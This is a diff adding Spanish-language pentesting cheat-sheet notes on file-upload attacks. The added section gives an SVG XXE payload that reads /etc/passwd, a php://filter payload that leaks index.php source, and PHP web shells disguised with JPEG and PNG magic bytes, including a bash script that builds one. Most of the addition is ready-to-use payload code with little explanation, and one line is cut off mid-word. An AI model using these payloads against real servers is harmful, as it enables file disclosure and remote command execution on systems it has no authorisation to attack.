@@ -48,3 +48,38 @@ done
 - [wordlist de content types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
 - ejemplo: shell.php con content type image/jpeg
 - **GIF8 (GIF) o JFIF (JPEG)** al principio del archivo esto hace que el servidor lo interprete como una imagen.
+
+### SVG + XXE file upload
+- Se puede intentar subir un archivo SVG con un XXE payload.
+
+``` xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+- Podemos poner wrappers de p
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+### Magic bytes attack
+- Se puede intentar subir un archivo con magic bytes que hagan que el servidor lo interprete como un archivo diferente.
+- [más info](https://en.wikipedia.org/wiki/List_of_file_signatures)
+- [más info x2](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)
+- esto se basa en la firma de los archivos, por ejemplo, un archivo .jpg empieza con (en hexadecimal) `FF D8 FF E0 00 10 4A 46 49 46 00 01`
+- podemos hacer lo siguiente:
+```
+AAAA
+<?php echo system($_GET["cmd"]);?>
+```
+- Lo guardamos como shell.phar.jpeg
+- Cambiamos el mymetype utilizando hexeditor, poniendo los numeros magicos reemplazando los valores AAAA: `FF D8 FF DB`
+```
+- También para PNG se puede hacer lo siguiente:
+```bash
+#!/bin/sh
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
+echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
+```
